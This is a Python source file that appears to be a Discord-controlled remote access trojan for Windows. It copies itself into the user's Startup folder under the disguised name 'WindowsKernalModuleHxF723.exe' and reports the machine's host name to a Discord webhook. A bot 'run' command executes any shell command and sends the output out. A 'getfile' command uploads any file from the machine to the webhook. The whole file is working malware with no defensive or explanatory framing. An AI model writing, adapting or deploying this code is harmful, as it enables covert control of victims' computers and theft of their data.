

import os
import subprocess as sp
import discord, random,shutil, sys
from discord_webhook import DiscordWebhook
from discord.ext import commands
import time
uploadedfilesWEBHOOK=""
controlBotToken=""



username = os.environ.get('USERNAME')

filee = sys.argv[0]

print(filee)



runed = os.getcwd()
print(runed)

try:
    if (runed == "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
        print("Autostart is already enabled!")
        print(runned)

    else:
        startfolder = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsKernalModuleHxF723.exe"
        print(startfolder)
        shutil.copy(filee, startfolder)
except:
    print("stupid workarrounds sometimes work :V")

while True:
    try:

        startcode = str(random.randrange(100, 100000))

        print(startcode)

        startdata = "Code: " + startcode + " Host: " + str(os.getenv('COMPUTERNAME'))
        print(startdata)

        hook = DiscordWebhook(
            url=uploadedfilesWEBHOOK, rate_limit_retry=True, content=startdata)
        hook.execute()


        intents = discord.Intents.all()

        TOKEN = controlBotToken
        bot = commands.Bot(command_prefix= startcode, intents = intents)


        @bot.event
        async def on_ready():
            print("xd")



        @bot.command()
        async def run(ctx, message):
            print(message)
            if (message): 

                output = sp.getoutput(message)
                print(message)
                print(output)
                #output1 = os.system(message.content)
                
                #webhook
                data = "```" + output + "```"
                webhook = DiscordWebhook(
                    url=uploadedfilesWEBHOOK, rate_limit_retry=True, content=data)
                
                response = webhook.execute()


        @bot.command()
        async def getfile(ctx, cmdd):
            print(cmdd)

            b = cmdd
            
            webhook = DiscordWebhook(
            url=uploadedfilesWEBHOOK,
            rate_limit_retry=True, content="Your Requested File: (8MB Limt)")

            with open(cmdd, "rb") as f:
                webhook.add_file(file=f.read(), filename=f.name)

            response = webhook.execute()



        bot.run(TOKEN)
    except:
        time.sleep(5)
